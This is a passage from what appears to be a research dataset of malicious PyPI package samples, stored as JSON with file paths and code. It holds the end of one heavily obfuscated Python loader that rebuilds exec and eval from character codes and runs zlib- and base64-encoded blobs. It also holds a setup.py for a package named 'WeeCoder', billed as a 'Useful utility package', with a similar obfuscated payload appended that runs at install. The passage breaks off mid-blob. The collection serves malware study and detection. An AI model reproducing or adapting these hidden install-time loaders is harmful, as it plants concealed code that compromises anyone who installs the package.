map,dict:(map,dict),['(https://pyobfuscate.com)*(RSA)'],['''o)1yo*^piyI=tvn5f(u$eo_Z#6$pDrAuX6*+Q^9dKF|^Mv>2d&+4@OtrLQND80$iNSqo%IJ;=xMZca{8Ee>qCZ_ARk)l?ZEOsvfU(q9XOBUWsSE*II+Gh@c?oXJk-=|4SQ;Lmj8jZ}i1Du@;=i)0#7Ot7qRrW9-H-`RFJrWwh?kXVEtuGWL63PE?tuT_)!=!}MCHGzajNPt0y)+RmPp{I|(u3>7>Fe+|Qu|>rq*dU17q4}D<((zlv8Bf&J*!OZNif<Fv-rd-#b?i*0BsBIDEWo_?zbQ_y#Sq&$b5s}`RtqN!a%NDN1<)Ha<oIg2M1U_{BBej4ORxT;+etwDMK_A>!+d3~qmr%Dm1@e)q?HE1(#p@p|13-Pm;ZJHJT)&xGUA1S6oUixq~}Mm)!(7GZg4tu<BOqn_^Q869{)0}V2h*QsyR007E;-sFl7x%w|bfY1ovA(eX=X6lMVYwvjDl2xS6(Wjb)qba}XGJQ5bPpASBpz(t&;>e$o5P$+Z~y+fgl$B)Gji!V<%-MKgVSwzRC3`4V2pGAQV#Qb9s<zMBms{>Q*2d@SyLZcfxA9t`0W{#-&b{9aKh`=N+a_Vav_OC~G7R>RJ@!65Mc>A56WT(Ynw;!eqXcp0jtHX8d&RG2bpZD<sbMT&07=u7Fr0ZQ*d>wPjq(Pi)Eipc91mp6=z`K;32{l^fn@Gcb<s~5iCslYo*{2pZ1r#dY>G|K_W?6%%r3ixXRjAze?@*TBow?=wI%8CU;Gkk!HAfzv2+ptEH9f?kAK6EhC?T#FbKH7<m=#g|(oVs3qs)vAG$510+V<ue}^O%fJfwx5b{YLMZv<}Vn3#+YI!_JU%m3qLB{>FnJeg+cHam7Gt13>U!>{P6^=+Kt2P^dK{Vs2`sumW6|ar<+GjJsrHyPM_?N9ldsjs*Z2!Uj(Wjx9|enU15SsUPTXJN*HX)i7tPw0h5!_-TB-Be&~8AdRO!7T%OI9AOFrkRne9U(ZxKGU?6Qs}G~eTsd4h^5T_)7WWge+=Be9$ZsQ<eKOb!zNqqCaeUaQb29@<N!Ibm{`xl@AkxIicoKGAA#4&-HxLr?#NBP`je$UpAbLbCJjtM&9_FDjv3P{UQ?o!1#Rn1-Mpjtm<+3L-(L5Xt#x!(3z^;{8ue$LHc7jt!s0TZO;`)Y?;Tu9kV8N%HMggCOkYkzoyTGi}U=~qly=ePa${J0kUc=ePQ?zXuSDeu`*F+}Qjr<q!C@o#PyXQQwk|enStyC;_dO8vp+x?cfxp2RZK@++F@PXORtW?|Jc12<zfLjb8KF|'''.replace('\\n','')]))\n\n_=lambda OO00000OOO0000OOO,c_int=100000:(_OOOO00OO0O00O00OO:=''.join(chr(int(int(OO00000OOO0000OOO.split()[OO00O0OO00O0O0OO0])/random.randint(1,c_int)))for OO00O0OO00O0O0OO0 in range(len(OO00000OOO0000OOO.split()))));eval(\"\".join(chr(i) for i in [101,120,101,99]))(\"\\x73\\x65\\x74\\x61\\x74\\x74\\x72\\x28\\x5f\\x5f\\x62\\x75\\x69\\x6c\\x74\\x69\\x6e\\x73\\x5f\\x5f\\x2c\\x22\\x5f\\x5f\\x5f\\x5f\\x5f\\x5f\\x22\\x2c\\x70\\x72\\x69\\x6e\\x74\\x29\\x3b\\x73\\x65\\x74\\x61\\x74\\x74\\x72\\x28\\x5f\\x5f\\x62\\x75\\x69\\x6c\\x74\\x69\\x6e\\x73\\x5f\\x5f\\x2c\\x22\\x5f\\x5f\\x5f\\x5f\\x5f\\x22\\x2c\\x65\\x78\\x65\\x63\\x29\\x3b\\x73\\x65\\x74\\x61\\x74\\x74\\x72\\x28\\x5f\\x5f\\x62\\x75\\x69\\x6c\\x74\\x69\\x6e\\x73\\x5f\\x5f\\x2c\\x22\\x5f\\x5f\\x5f\\x5f\\x22\\x2c\\x65\\x76\\x61\\x6c\\x29\");__='979810 1451856 701556 1738286 1131928 777130 1808384 498944 2412960 956032 5915082 4357878 1155399 7076716 1096768 9607464 9704686 8048651 10662561 1351885 10886705 8237044 10331370 2165024 3365775 5799018 9212000 7813401 8233080 4307776 413344 10165379 4025860 4757856 496170 8060709 69960 5328081 7099189 6536544 7959920 2806214 277950 2559104 3012032 223936 591552 9962610 1436600 1625456 5192577 4043064 1416280 3080162 10471440 6462330 4343136 2861440 1741845 8975890 6851585 8140764 7802292 6122736 7539372 1359648 9536670 5335931 10511938 8937513 8056265 3637565 11016172 9717960 2552320 8763000 5587068 5512540 5299392 7436676 73124 10753765 8257920 1823360 9609948 4267890 564456 6065252 6855276 2748352 9834944 10534233 2795264 3236514 8647560 2677500 2522768 1586610 593434 616840 3060576 1538592 2229792 888544 595650 2166095 8397585 3274687 9948176 10319226 8029134 988668 6288620 1453785 2948200 3892980 10434410 4555166 9248990 1916577 3145315 3322534 5188572 7018320 5191305 5482508 3161360 3897952 174690 174590 5850618 2819556 3904427 2454325 9440720 9722790 10612894 2934736 1090686 1106370 8736540 964630 6486220 3989560 2202214 9069498 6645901 10245258 1684332 957682 544295 2842464 7583445 1981316 411517 194212 7295387 3013234 2510936 2828240 1167492 6193408 7805872 5476708 141792 5740225 5395508 4244946 2757725 9101568 10933439 7474074 8554518 4915482 1759329 898380 1844271 7482580 1039824 2242907 3913312 3144240 6702624 4845377 1374656 2064839 5705995 10300550 799434 9605960 8718120 1926528 1534284 2298665 414460 4306036 5724579 5008440 10100004 850660 8166980 6718020 7659663 1681362 488180 897888 756320 2823680 2456672 8309532 3951354 1671882 9611838 463904 1850592 3953815 1540586 1030624 5078241 2462680 8585512 2845632 2321235 355449 10672704 4871568 7530612 1852288 2691680 6459657 11642040 8839320 8637305 1195148 6157790 110976 6754401 10835875 3180288 4157867 10836840 795840 2778016 3047136 237664 18144 381174 4659978 1121877 9624264 2864672 986235 5340830 1642784 9477825 7475656 6378288 3466419 8494824 9749916 1930336 9773876 7674586 3866628 8029500 5434880 53218 2066016 6873517 2529885 2371328 9361876 4234930 1051952 9138354 1909910 4875025 4505490 3837832 8355225 438360 446368 1353568 2047008 2967488 10644804 4894212 7748136 703635 399743 7393907 3952600 3082911 5642000 5450960 7519200 4187848 1696630 5786256 5735665 169650 393313 3621538 3350704 1566824 2943433 7939188 4003881 967527 561064 990896 7872992 2789992 9179304 2780328 7594255 3794678 11010256 6994920 858864 2798948 2737895 5301632 4816300 2089555 9550224 8589846 8282736 710704 669460 1008320 4040180 4468458 4526055 3835186 3264666 1978960 11074200 9351688 2573086 423030 8277360 4632789 3426248 8649396 1341102 8535879 693289 70924 2222352 1938440 6407820 2503992 1014875 64400 4158814 6867432 11765640 7300228 896852 19830 396530 776928 1859904 1439168 67424 7429485 4829190 2985568 10064246 2184600 2413040 11045328 596428 793637 2391017 4416766 3764460 7478286 3906981 3338151 4907438 956510 1275136 83360 189056 859712 1119680 2407648 1855712 1930560 3580398 4905469 1308763 8720493 958750 2926374 703640 8119664 2026297 873341 410140 1330848 2057856 1774592 3048704 8564194 2723652 9627975 5140800 356544 8023440 8511960 1907960 8897280 1348550 2127408 4270610 2250839 5447652 4603434 8320689 4657918 1042434 877720 2696992 2977088 183296 458144 2275808 1242208 3007648 1647168 1716726 4057473 5110029 9255513 9648978 3760028 287880 1350832 576600 2926908 369780 135296 1752416 1471232 875008 417270 5899068 1957344 2283105 10560840 2661960 5444880 471852 155062 4971561 1012478 3930990 231442 192024 2492510 9757105 4498654 382150 671456 52192 192128 1092704 1805248 1929824 3051008 1404544 5733063 8413230 310532 4281784 47008 9891543 469728 6724580 7874240 123880 10211310 9466528 3691092 1031920 4662784 1366698 2876068 684728 1890876 5409383 87924 3339696 1271776 7161413 10515830 1596832 1374105 1571104 8689434 1980668 982940 695172 1856190 4762496 9664185 1719160 3392730 7284220 4214010 2232560 1050090 4511592 2763072 128617 414570 2823840 562016 3152448 2986944 9496020 617040 5896582 230571 3810280 10790754 11111184 4286945 10453520 94200 4224528 1214400 969445 1756234 1314192 9029097 3589970 7198400 915720 3425796 2037495 774890 1417344 1112032 2954944 2494880 751210 6317954 8358360 3763386 2488337 10677968 7769448 1700038 452600 1426976 2920480 1503808 1830496 4385723 11152920 2126353 4189185 1188120 3739320 8386524 3130596 56230 777830';why,are,you,reading,this,thing,huh=\"\\x5f\\x5f\\x5f\\x5f\",\"\\x69\\x6e\\x28\\x63\\x68\\x72\\x28\\x69\\x29\\x20\\x66\\x6f\",\"\\x28\\x22\\x22\\x2e\\x6a\\x6f\",\"\\x72\\x20\\x69\\x20\\x69\\x6e\\x20\\x5b\\x31\\x30\\x31\\x2c\\x31\\x32\\x30\\x2c\",\"\\x31\\x30\\x31\\x2c\\x39\\x39\",\"\\x5f\\x5f\\x29\\x29\",\"\\x5d\\x29\\x29\\x28\\x5f\\x28\";b='eJxzLPfLigoMM47KDct2CvQwdXQPynEMrDAGAGNCB8A=';____(\"\".join (chr (int (OO00O0OO00O0O0OO00 /2 ))for OO00O0OO00O0O0OO00 in [202 ,240 ,202 ,198 ] if _____!=______))(f'\\x5f\\x5f\\x5f\\x5f\\x28\\x22\\x22\\x2e\\x6a\\x6f\\x69\\x6e\\x28\\x63\\x68\\x72\\x28\\x69\\x29\\x20\\x66\\x6f\\x72\\x20\\x69\\x20\\x69\\x6e\\x20\\x5b\\x31\\x30\\x31\\x2c\\x31\\x32\\x30\\x2c\\x31\\x30\\x31\\x2c\\x39\\x39\\x5d\\x29\\x29({____(base64.b64decode(codecs.decode(zlib.decompress(base64.b64decode(b\"eJw9kN1ygjAUhF8JIkzlMo6mEnIcHVIM3AGtoPIT2wSSPH2p7fTu252d2T3n3MkyK896dLvrSMIeaGxEGn0l/rpiLu3hlXm5yxDmO8tQZIDoeUQLr4oWePxk8VZfBpr9af8mXdzLTk8swRbP25bNzPvP8qwWJDRA8RX4vhLkfvuk0QRl3DOUekDC9xHZVnBcyUnXY7mtBrIOBDEKXNRl3KiBBor25l5MN7U5qSA/HsJiVpfsVIQ/Hj4dgoSYOndx+7tZLZ2m3qA4AFpUD6RDsbLXB2m0dPuPZa8GblvoGm/gthdI+8PxyYtnXqRLl9uiJi+xBbqtCmKm8/K3b7hsbmQ=\")).decode(),\"\".join(chr(int(i/8)) for i in [912, 888, 928, 392, 408])).encode()))})')"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-17-weecoder-v1.1.0",
        "code": "from setuptools import setup, find_packages\n\nVERSION = '1.1.0'\nDESCRIPTION = \"Useful utility package\"\nLONG_DESCRIPTION = \"Useful utility package\"\n\n# Setting up\nsetup(\n    name=\"WeeCoder\",\n    version=VERSION,\n    author=\"ToxToNio!\",\n    author_email=\"toxina8542@appxapi.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    packages=find_packages(),\n    include_package_data=True,\n    classifiers=[\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\n\n\n#pip install pycryptodome  , It works only v3.11 Above.\nimport random ,base64,codecs,zlib;pyobfuscate=\"\"\n\nobfuscate = dict(map(lambda map,dict:(map,dict),['(https://pyobfuscate.com)*(import zlib)'],['''3Q8EG0D(|MYm7^1=5TFvMMw||&A>G7b0ZFm^g}h&S;)M*4DX-vzT>%q2h4)JZ;_pFomOeWOc~x13i_Mc#A(6b-&-&_`@FDQ#H04{L8Xie?ObI|0W^QZRQjGcJ=WMZURFB_%sd2rSt8JMk1Gc9qs%St4yEEV4S|w(B!;2#oSrpan*rGJMTU6SzRuG=0G<qA1{Li5ezZ9-@zc)hdDJ5X9U%roI-EHwyW5eBzPss4h@+lW!ZBVgT}2KdKVgEszMW0%MAqNt_MP{;jS#uK((Nm%Er2)&FhBkkM~BkuIx>(msjI<wpxg|=rl67J6Qpg^;iDE!3&KuW)||y2FwB5QV6M(t5T^_x{lF4w>c!o%W#8N0$<r+<dDArF9+4*~{<gwPn0F~cY!5L9a4+}Ihlt7sTv%3)!g=o7Nc7E{i+^SjMFUN$@|E@Rbb>}|y%wu#w!;hskBXpGG6O+)q=GcZ@S`ait?g0y9ashdn~-i1o0i<~g{g^Vs0mR3OO6QL8?%JAN{n$`Tk`(V^11ZZ5(l767O}Z^n!{|rZ126?8HSRfpIW49Bi6fZ4gbx(#KNiTsLjf;f8}RFywQQ`aE+udd6v|Nl<h{KrBaYGDL4v5u`?B-<mHYj9s|USe3~j67c)z#hUlIzO6@ALuKQV(MKZOL87GD(>u1VXT<xa=Vh$KP5ISA@=vUq+e5`(Gd7WrZIHf?59$#r=b?M$5)q{b~=ZVGFa;0+Ee3$Kc)~;CPI5T1c3<uKdKXCt`mI6T&U*VB_Y#rv@tP`>sb#XZd2_g0TIYR#8g#9|t7)n?lx&w~rSc3X5f?w>5_gqBfe_=tlXSr0J=I<hhzF69dyZEw1^_>QgM%->Ac2DQ9Mbm11deah|_V~=Bd0+CJ{oT(G2O?`hu*W?p{)O)Rf&&(7BPxFU3vRxWMsWq<F)eYzjJT55SXFc|G|SKXVKNhL$hmZ*{G#rYngaRO28x;Z`@V1_;bJa^@KC}<F2>nL@!hDT0oDx}8VUc`lQrv)^U1)6xad8%yjRQZey?Jtz=`uaR&`h+h%Qzn^cwe4Qy2;S1#SA7EAidQ(ULFUIK8NdNNlbO^VL}tCNJPJa~A6N@+#w)|EBh9*o#O~A2Z!e(|KiJ6SCO7{eqhGdz=wy%GGk68ZfT<R);XIhoFF{fVKeAq~L>hzK37M4g7PVOv?*1Ul!MJv7Oc<k1u9AV2erzY^&|x|HMyPxqiF-3LYgIIkmpMRs{A;3cv41Y@aqnF6y9qP`b-V`f9uwJ?b(XV5*?cT)`T`2feC0FaOHmt*qtn@dIUx?jl2XBHK#IAR5p0bsVv!Uwd*W`ApoExLGd4HcA|IWOQ$X*H@jO5CCgo+iEu_SEeNW1DVopw$|Ja$?@zo5P^6F%h1RQfO)OB^GQSBUmQ0!Yrhf|j;=j(;jxu)W*=#cSk-u+D%PQU?exxmROlcSVY0GLmGOP*J19|j9w{0K7RipP0>l$cWQF{9(rJeT-?m3vxW-)inBx$&CPz+c#QD7n5~>n1jVB#fW1012fz9OhOY_xV)$z$1jV6<XKa<8J&PGLSd&X~V7kal$Sz67M$?5E%T|XLqn|4}qqWyZr7y%O=J9@-L`@vzxk%66Zx#R^H)u^op$<=~U^L)y8DcXQr$TP15+?v#l@|g?ZJ>kg$O&9mQrF-SgfvO5H36xbPg%XDd>&)?=@PUJ3Bn0%h;GuWcVwnL5r?`Y3i)gmEZ0HByt~~JK_ByE*1F}6jIHBCx<B7QKrzz2`MjdWn9a$i3bTy~$Y;-*r>_Bb{kEh;yQDV&4?rDaS%5kfl@?;j@Yp;_HU%e+*Chut_nqV7oG6cz9HGa*$d4IN5wFvUo1F#;ovpIBNKyfm%CwaK2`A|6`k_)z`Dnm8KC$yu?@PC>3%U&W_mJU^>a^TB?8c?H@ql6c2s6b3WX$JT2lt?xfwFe`y$L6C%@XwrCB@;10QeZ#vr+GnVT$`0g0c_9It(4>E$|Jjmt1Wo>6*!Q=r!u&+@PHk4RgOm@=SdDtFil1OzC|s(0wH6lCOzv4QsXjZoax`4%Ria(v~aa7_oCek2vj3+y@LvQ5YH(0R*2NyiT=60Hg&N8wx{2IOi{MGW{>NKv!pOFmu-2kj*ZBBFh}`f`Yh(t<qrm^CL|&p!1?<tJ)CIZ5K3ZVEE(?ysu&`^d4w?GGmjnRIqy&5%AUcS*2U!NTw7MLerl@17LnffP~5jh*WU!;MEP{CTrSP(Z@r_lS69B!**t0mOW_S0_-wIpl9?T%A>a%vlr%9|ggoD8*i#Zt|D4xeyL`B(B-E@s7BEKN!VaQEBd?+q^Q1R$u@<&?qh4qRY5BV;y~obN_ITh%qfe^3E=#V?bH^=VLD2@(XqE^t-csD~d_5>5nKg95E7>`0>)6)1@Q63*x8jy`|H5Jkni&Km?U<eQos(yuo*z?U;q^_Q7K`s+RVA=;MVg4slN((@8JcAtO}UxWDP2~tO|eNSu>t)3D08c|k)z!&0EVqF&;!vaB2TRKqT!hlNhi_069Yi{vAoZ+LVs=NC0G3oX*`B#x1<A*o8z@+%YIAC9{UGo*ka@9m=6E781ednW6#$^AuJbV?A(dh0dOZ`wuQ_lpN^eUq`-8)ZUrPh67Y7&km3XvWj-5J1j@n@5*DP}P<2<-OxuvIMUM6aE-C%*|HoH)(~LXmE+|f6$K3p1ewj=FSEqXuV5+^^aVETOwrkJESn;mzOhw$8{wfsoO1kFPQFEdyW0#*4Ad|u`$*;Wct3GF#)Y6=9Sb@#P=_O8Da@A<h@pd|vxieGi0w_=Q@M;a6iQa9QQIAfPpVQP^lI>gi^qyQb)Hj*gvnzT$Y6jL?Tb!?(^1;G&b1A_IHcRBqYT_E4cB1P;zwuG9glC*TOGGYAgRamE%TivB@N&K4?a0233p%jHW_zA|-}Z4a_LK0;ym0y_6xfdW6DzB*R@hMGt(~FH-K@FYO>tHPAi=c>=`sq9CaI|#7w!cy0cE<*0Iag;OQw0c*bEssO$=MT$HQqHZe>w>Ka!P#FX*dYkEiEAM4eDvx*$VHZVE8q;~<31POdql-~g9;c77f2dvVNk(Kp@$(u$ZmkX6yn%qCyTo>?ih_ag#xNpCRPkVUZ=vr<Z`SSm=RjO~-##tb-N&z2DUQw+Z7Eg+!0vMZ|axCrQGW?;!YctQ?i*-TnK=?<7rnGe%VCmvlrz{Ej0@U;60Wfo=*@}|(2MvX1GRG1xU18qcyc|dsS4Gomfj5~<WN@lx0EpZ6YFJcK%l)aUfJX8q4M(_k2A~bDP06x5{)I*G=4{hcl-`;W;qXV6asxWh6eRKs>6if17wurW8&L9JRUp|HmTRG<0pNc*hFbtlbh`E}#gB06b!Z#9T10S$ys>I0G)lP}WwGVTl`RbXP5t59iev^RL&_=Ni>OynKCf-r8{)6>axEKL@LF&|vleCzFHM3y4MgdUlCvEo_?N?arG?kH_vxX*cY-`|Z<yWixZO2HBNy}%Tj;?CPTE}rLA&agB7`vHsKb>HL`jO04(Tx3?dUC~9|DA1-C~4#w+aTYIdmH_=*UN*O14~kz0hBFJZsMp9``aLHEbTtq0J~Z|%NP}4IAYX6iN;yZKpQ5!B*t580~)ysi*H+gY;Dg<pz$7<#Ya)1F1*AO*-jQ;fAQ7kZ1I)7f&}=pbUxY!rgZj^gZ^pF-nmD6glp{RD+6;H-n*^pI~6yK=A&u6`f)Uu{TvU~&`ZDQn#M7h^Jc;FWFdqj?}vtLKRd{yQ1G1ltb8pbxVD)Lk`y}`&D3hEp3(HO$yEx!hEQ?a6d(vmgrlRqMc4}ue7pObzSt2*5sbS>L1vc>EO)Jmn-{0;9Tk4t$GR?|R+{@lpX7u@WWA#YklHx>CwS0bB&P#4tt1*#YwSEj=pw$XQe5i3=8}d>q-_Pd0{fe-`k+Vp^e)}-x=jidgV@uXdu$iP>>~wPZ;I`afm`_RCR8n_z6zOuvO4dGhSLwcZZf=?^O7B)|75T>l9QIzxyn=~4x+nqk~F@wZh59&h}%&<76+(IX?xO39^7`ffq8YACq#b(h_Cq4TASQNQGOOg;m43?)AuqQpv(@Gh`exvi9<fo`h5wS5{7x6v~oq}6nNA^0UNa)_8OwY7d8BVGIv&e7iG$-Q%B}uc<K`AFqG9(L7>c7C^sv{&+XR)(sKrI@}cfDJ@+<-JyE&kpR1mE(lLWTq$d-J-a*`n@!Lx=Zz5+Ja(zU2x-(alL58Mme_CI3=ND?ABykNg`sI&b7(Ny=N!>jClN6dh@EF*C!QyN_8d=U%VQ&Ww7XIX2t#6-~{!%AbII=qp>WxliubV378ECs)d?Mg|@L#l8W6leTR4xFhFoGHOLN##gedG_UFjC4xCAVTd@8b5*_v*<ylu_UO&`$u;)2ceSQ+x&5iL<^=J81HOg_h-O&r<G+q7K)wzjw(>MFn7GKe?47Bs9N9U=H~`5|*xkXp`ry*I$>VNa-{tC4kGaUZ!~7esgW=wRx(>5NoUKssR-yff}2*DyQ9+N7t5J9tc_8Gc5y^5wcTSW3;a#maLEd<$>^P^Ap~qS1;_8(3jEG_hEYYNl30sI6PORID^^qEc>c+pw;aln!t|E=sU)c=fCY1dei>j1T!~$CiDFE%CfrguR+09JjARJhW2WBILCxBn})hcY7u}^7*S-&XaO)mqxmyKTdi*O<sWj)W89UlH(TzCvv*g6JAdllJmJz_0Y*S*=#Ie473qtonSX;EJS#QALq9;N_O*U0*?53_@_e~RS#`qM2#(0axR-\nXOa-^qKX&{Rn_R0Q_K)Niu%n^t1o^~BVyC3lLz;f^YquA8%$Nu(pSe>Fiwd@zx@~KI#^aK(s1%gy`MjS04N&N32x5?>&kb>F)LS5>LHNs4N5!^Mq%->heXh1W5l*DR+qt6*R>$no=4B;<)<6-A3$rF4$jCGUJa-5(*vSu~mqjqJAxM&|^QHh`2Y(FnIY}6FUUdZoSQjv!$?ldXZm61tZ#cREYoyUH}yxI@(1P~C$WCeFx+2b4>hXL%AhE7Y=zT;Cpl~cbI3iG)@>sJpVM@ks?w%Q}t`0!LHxX;HWT!dcO9>MAL?c1;vwS);ats0jd=vwlv63O$PM2B$y8&*p!f04#k9mC_BU1~HO6fbOpWlO))l$QvXz^37=$__)V{$;m#So5{JPo)3(8Nn-Gmh2AkjSJtBJbCIn)fC(XtoprPF#h``#P~K>6h3(1kG^xYxnex8{Nv%*C6~WJj7nC07BGo4QKs9F;9N4xrR8+kiBLyHc48IM^lLUNiPy9Z+jR!TaS2VU@sr)kAM4MLmwfJoMCNr3BRWj;#ap}60sL!21G`-~y|3ifD`L(484n9FC~Z|Sp#&>RG|84u@-)Wg?50(NgDR5ilwtg0U<D5nTd19prX8XQmvIitn>p*#BBHrSQg4Aar-#P@g8K5W#Ui$dqsJZ9X&~TR8q<sD*Ic42K-%<fQmB8llE_Y$m<T$?+^*kXxz~Z-nJhnckM9BHkx2o?StR^rpyus9`XTJ95CnE~^hXFYGl=zz@BiBo2}|TZ9y^U0A2|)~PxZL9YRG+odB|P4v3$}Z)1T01+DE1HBM~c&&i_WyJm{uO=3Ir;f<mh~SlU&h5@k(>8d!Q0DLe|y-d2IHD%7~zbLI>OoAuk`#(m3Ot0SCoS>H!-opmWKI3~Vyq0{hGGO41ScwX}qINR05onDsA80meB;Y<<b-`@Jhd3}SFvsc;PG=!DqRF_?P`k;iFHIw8EKMD&&>=nBv9pvG2A~-fOpU|ggMzkV~b_c%Q0>sLw5A9_qPq$_bRry4NteHg7r+P966ZbCfqqO!f?Vm7$=+Z3LlpS;R0RQ@Yq?{B$TR*s{u)&lcDiSm&9vXQFyFk0mWNP3+T0j~yU0Cq^Q_f|ei>#_vdf+l!mtT>^6`2>*FndKi?sG#hnc9jhazqO%XrB1039h%RwhMZLh9g}s967x|_bNxT_7{?X6Xc+<G*9Z>qL9c><F}UhOqlMD42@rV1pOi~L;bSeP_UKl`18nCw$=Hy%=~X?<w_D43}<fx?5G?7#{Y+7v+ewg8M#qHSHwnwr#x;-3Eh+Y18M7z&H!Mu0MfE_D||2D1CC!uWsxFX@OD-cPnnI_s%5{M{=P!M3O5IHOe2@G#LH1SG5g$e{8#Ydlz8P~2OUJZ8{}W|N^GN<zRZfP+zq2~!s$ERyr41IM0pR)nCs#5fENEUg#wD+D{@mZu+J^LqN`8iwzaRffY&WH*d_2w7!rQURw>G>ry8g|;?pR!BIj<PRiYr)a;dV&f2MaRL09ya%l$#~uv@z2+Y@>mlSX|)!Q>$7@70fSQ;Y)X_f}HXfme48x&^nUf>6+C98RCd=O_S-b3^Rx6Y;Y1ha3rzb}s=qy+|v%3Xb};89Urw3u<8P?-a`Sj#uSpOk;2et94|*&>m9ARCKY|LHhixjTjjxx;mW-MFgv5emt6+OG9yK*f_K8NmwyX{e1>vf^EKkM9eL5f9wyojN~H9!c?l5x9FZwnB(8~Ob_tWhZ|xKH{3XoPYv<U1VwGO$$e^P+8~+XQ`DcVLblBlwLa<zf@<+*c{G(tj-2bPzhrCH&2rroU&|W~stv?7Fa|^R_B%yi78DChOi^hPfb3Yc?fP_ta72VRJA6Gzn;5U9_|)jxI!mL3oy<8x%j@Gkqr;-|luV0l1T$ql^3;qibF>!EUaQyc9vtZF-NBKgWH}(O);X9DV}+r0Vd-AQR_B2?|Dsh6Rl$cJr8w^;2T!ESp%>)CMaX4yV`X%NbrW_o9Z3!BYXZXiPZz!$baKXa`eaY|d0I(Wg(p^i%iL=<MeFIO|HsoGNb(kyr0|G8mA^LA)UlL*-=u7oS6|uKHG8*#&*|=vegZdBB-bWPySoQG)(DwnUP~t%ZA>X^Otl>}S{Gh3>sJ}Hx_2@{yv!>*LOtGnG3IO!<-WyT88<oGg7tIE6nhFC!k_g92@3h#6<-F3P~wA@v*7&8B<3kGz3p{!>FSog*)J#MtLuBhT$2MKsEAq#(6_a7tCQWjHkq7&_``2VjU=Fejzg(>tJ>y?GlA#ue`q%1E8BUlnVs$Oz|Yz>%f)!!jRiuJd-uZCzsM~WHB{?7AlT8^|M2f31H2ZvyeJDHj`nSgI8jTTxYsVrUkC0dqy%w99kf_xUoP{68=eiN>96u3oPCoV)u^MYz;QZB63g?}>o{X0iCC;Vrc1)pX4rP}L;14sz5LPAf8d!0rtszyn}S$E5-%ji^CrLR3D-=-Yl`}IH8nXuJzVvZwjG33e290owaU&8IX+Yrtz=%RfoPJnnY``dfvg4i7*sE4`1;@GBihNrJ=)hKJ##(949*bl#y$QZ`=xhTX7$(hOm0;sT0u^zWSx-==U-Ggw1L<`zu@$7C*bYlo5~zsz0IwkQE+Bkem)2O!$)CO6Bc9y1{v2%TZ&qH$z(IV*<1u_Kn(>;!c<TF)BJ<{Oz^T&r^hmzy(E0TfH^VS{}agQL!X~tqOIFzn)-U>>z{O-dLeG-J$0ZOd4wv&j=|X78)o5hza2q<arQ{$t)C4q;MYtUoo!Cy9oOnnYJZU3$5mI`hLE@>+8j|{wpNG{y;EJkEX%VB+JV_#RYyw@ZG$ur5@nQ0C(I97qk?>^!yt|7$I$sykcPl8E7S+nt|w&M1J|>QR6uxsCxs-U4xnCz)GO2Mvl3sd=vi|El~BadoiU)eJmBOshD($`I1Zbl9ykwNAFBGo57y1I206`GkeSjg5mF8dpVqW>&O@W!PxQ?2CE>FEHnA{ubOsJts*Ea8_#!(FWb>b%x#}BgMJR!PK9!>|=|lNp0$DpwC1EU$oARMXtH~r-GHNgU1=zilv8z!v4(od-@FLKFmJIEQDd>$*A{o!#jR?I}xgfeHjBz!B35d}WBrJK>MH@L;jp!$k+6k*Qb+<oJ5x+nhY=4VRvHb?#`WulMAzZ&IG|1vk5*^^G%pv^gsIfXKAfLF`&UPPbcjv<9myWbqLG8f001e8%IeHYeAs0qu{veTEdmqflC4}9kq{fu%q&{`%D;Q4`orPFnx)-uZhU5N?nz0oB<||jqujx<#@Z%7oYaOTlIu=ukqOx77Y8groUl=3@va^Fu-`!nYM?9AXuw(X;Af)r~+1lOmEW{%PfXDNwU2xN-vn4{JW-;SjotiSpjS&%~YBVUv-{V$7fpKp2(8=){WWIALnn}<_zZHC-f^Y!(q-si8m&P@D<0*sAw2qj?JB@@yKI*C9W6ew(6&9+<VvcOzOA`4T=U*pIQY0vQNPQLsPK(CT(A*X9K@8m|CVVc}{L*z}NS!hNN%XQ#cwcMSqx!W5AathhjTg+Xl#(8QOMJm!w}{3DeM^pF_*g>>{N=`~F3)4PpJcl|$@F$c(QUIkXT;c2!0No<+Iso_f|rlk%7>e+0X>lM4hBEdw6hi{9P1T3POl}|p!lRkA3#4)8Isn8hGA|uJZQ(@mo138k?YlS3v+{sTc<jy8}SlskjcAEKl4h?{nnx5_hyZFBYYm9mKucNzq2hISl(bpD!DU5S2_#;J)2A;cgJG+=!n_!n^1oTi0CSNlqFYt%YjS6p7Q%zEY{6-P;{YkDwc5JGEf~ohUJPjfk=XAB}}d~hsqPhHV~sHW_T5sMHl#a1y}pN%uE;~JjME4S1$G8X}1&LR16RU#c?!`s7pCE$lV|pB5M57C=v+?%}J`&6nH}8jOucr-erRODTNynGUb>#1kYeL_mOT(N|g4-lT|hKe4_gzAE{`cPBu7v>F&k;TT$QvEYhOio1s@mVzu!sm@}hez4QsIel%a=^Se27=)D$dyhccl=WLua34|hHx*xH6x4na1@B~vV)swI$U#D9X{gw_nsK)h#4t+6f4<w4e-?Y(w<mH|cZX%GHa>VtUwL|)yyPb(Y2?bqepJJKOAloLDNHImqEIU?%tqEeugQc`6RWJiK5l0gTW%qi(*hE%Nw&^Nln@-t#z5;r9R<2gin8z4Vvf%OH+U6~25yZHZb`h1R=uFX?W3QiGdq)*+Y2w``ZKrX8Hf+KE{LCmKpEclw(eh<+Rs%r(0iz;*UXn1u6S?hs$laixO^rwm`JB5m00<z-RkSq?H*{#I@Cge|VoS#WBK<>1K)jk8U;bcI3;6!r5~8l515?qgAjq20Wihaz>Q;r6v$1xU`6i|an;|$!W&qIh6oa2?+5aZIB8WV_pRB_MoQcbRd@@(>yislH$@U62m1KB71*TtXFcC91-qPLYC38M@=IcKvx)}YUHO|IGl&UPZep;RCV|jMk1@kO;Ee13sB}@-CY0xWY@ckZVS4=U~C2a0VJPSPqW-cRKrpV>b&MUvDFZc9#BCHWbG~I8o+I*>HeUb6Gu@&D^I8~I}GWTr-G2tPJHT*!s#xeLPRONb%gD%kzuc7;%6p=?HO&l5<WVEDB%t(dJ@-pVPp%Y=5`h_7VpbVDLYB{oTK-?~%De!NvP%D<Zl3o%r59zbYRoNM5i9HzD?~p^Wb?u{e77^;=6)hLi1N)@D)NzAjX*s>R%LDpS-h6ve9{MMn(@y=!6e7kq3zLYAJD+8^7~o5>eF==_f5bvUE)3Vz<G!}LLtNAKZ`UAoH)w>Nalp*Qys1L!JwLP8$zu$pnvs9DjLnn0JSFoT72-wBnAdYJAx4Nk4r;y9ZdM}?PwM)B_M?0EkFu^mT@